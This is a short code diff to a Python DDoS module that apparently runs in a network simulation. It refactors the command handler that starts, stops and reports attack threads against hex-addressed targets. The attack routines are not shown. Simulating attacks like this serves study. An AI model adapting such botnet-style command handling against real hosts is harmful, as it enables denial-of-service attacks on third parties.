@@ -31,15 +31,18 @@ class DDOSApplication(Application):
         super().__init__()
 
     @override
-    def handle_command(self, node: Node, *args: str):
+    def handle_command(self, node: Node, *args: str) -> bool:
         if args[0] == "STATS":
             attacks = [k for (k, v) in self.attack_events.items() if not v.is_set()]
             print(f"Active attacks: {', '.join(attacks) if attacks else 'none'}")
-            return
+            return False
+
+        if len(args) < 2:
+            return False
 
         attack, target = args
         if attack not in _ATTACKS:
-            return
+            return False
 
         e = self.attack_events[attack]
         if target == "STOP":
@@ -52,6 +55,8 @@ class DDOSApplication(Application):
             target_ip = int(target, base=16)
             f = self.attack_func[attack]
             Thread(target=f, args=(node, target_ip), daemon=True).start()
+
+        return True
 
     def ddos(self, node: Node, target_ip: IPaddr):
         self.logger.warning(f"[DDOS] Starting DDoS on 0x{target_ip:02x}")
